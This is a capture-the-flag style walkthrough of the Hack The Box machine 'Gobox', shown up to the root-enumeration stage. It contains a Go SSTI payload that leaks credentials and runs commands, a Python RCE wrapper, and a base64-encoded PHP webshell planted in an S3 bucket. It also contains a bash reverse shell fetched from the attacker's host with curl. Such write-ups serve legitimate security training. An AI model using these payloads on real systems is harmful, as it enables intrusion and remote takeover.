      <content:encoded><![CDATA[<p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows  me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.</p>
<p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>Golang SSTI</li>
<li>Source Code Analysis</li>
<li>Scripting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.113 gobox
</span></span><span class="line"><span class="cl">nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.113
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http    nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
<p>The site on port 80 is a Hacking eSports homepage.</p>
<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
</p>
<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog is based on Go).</p>
<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
</p>
<p>Nothing else to see here.</p>
<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
<p>On port 8080, it presents a login page. When an email and a password is submitted, it outputs nothing.</p>
<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
</p>
<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ curl -s -I http://10.10.11.113:8080       
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Server: nginx
</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">X-Forwarded-Server: golang
</span></span></code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
</p>
<p>The following is how the HTTP request and the HTTP response look like.</p>
<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="container-root">Container root</h3>
<h4 id="ssti">SSTI</h4>
<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">email={{.Email}}
</span></span></code></pre></div><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p>
<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
</p>
<p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p>
<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
</p>
<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
</p>
<h4 id="rce">RCE</h4>
<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and passes it to the <code>exec.Command</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span></code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>). For example, <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
</p>
<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
</p>
<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cmd</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">html</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hacky curly braces</span>
</span></span><span class="line"><span class="cl"><span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">:</span>	
</span></span><span class="line"><span class="cl">		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
</span></span><span class="line"><span class="cl">&gt; id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">&gt; uname -a
</span></span><span class="line"><span class="cl">Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="s3-enumeration">S3 enumeration</h4>
<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; ls -l /usr/bin/aws
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
</span></span><span class="line"><span class="cl">&gt; aws 
</span></span><span class="line"><span class="cl">usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
</span></span><span class="line"><span class="cl">To see <span class="nb">help</span> text, you can run:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  aws <span class="nb">help</span>
</span></span><span class="line"><span class="cl">  aws &lt;command&gt; <span class="nb">help</span>
</span></span><span class="line"><span class="cl">  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
</span></span><span class="line"><span class="cl">aws: error: the following arguments are required: <span class="nb">command</span>
</span></span></code></pre></div><p>I will send <code>aws s3 ls</code>  to list the available buckets and there is one called <code>website</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 ls
</span></span><span class="line"><span class="cl">2021-09-07 07:32:42 website
</span></span></code></pre></div><p>The bucket contains 4 files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 ls website
</span></span><span class="line"><span class="cl">PRE css/
</span></span><span class="line"><span class="cl">2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
</span></span><span class="line"><span class="cl">2021-09-07 07:32:42     <span class="m">165551</span> header.png
</span></span><span class="line"><span class="cl">2021-09-07 07:32:42          <span class="m">5</span> index.html
</span></span><span class="line"><span class="cl">2021-09-07 07:32:42       <span class="m">1803</span> index.php
</span></span></code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 cp s3://website/index.php /tmp/id.php
</span></span><span class="line"><span class="cl">download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
</span></span><span class="line"><span class="cl">&gt; cat /tmp/id.php
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl">&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
</span></span><span class="line"><span class="cl">  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span class="line"><span class="cl">  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
</span></span><span class="line"><span class="cl">  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
</span></span><span class="line"><span class="cl">  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>I also find that I have write access on this bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
</span></span><span class="line"><span class="cl">&gt; aws s3 cp /tmp/iamf.php s3://website/
</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
</span></span></code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p>
<p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
</p>
<p>Also, instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ...</code>, that means the homepage is hosted in a different system.</p>
<h4 id="webshell">Webshell</h4>
<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
</span></span><span class="line"><span class="cl">PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
</span></span></code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
</span></span></code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
</span></span></code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p>
<p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
</p>
<p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$
</span></span></code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt/website$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
</span></span></code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
</span></span><span class="line"><span class="cl">www-data@gobox:/$ ls -lR /home/ubuntu
</span></span><span class="line"><span class="cl">/home/ubuntu:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
</span></span><span class="line"><span class="cl">www-data@gobox:/$ cat /home/ubuntu/user.txt
</span></span><span class="line"><span class="cl">d6b91...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the <a href="#explore">explore</a> section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ netstat -tlpn
</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
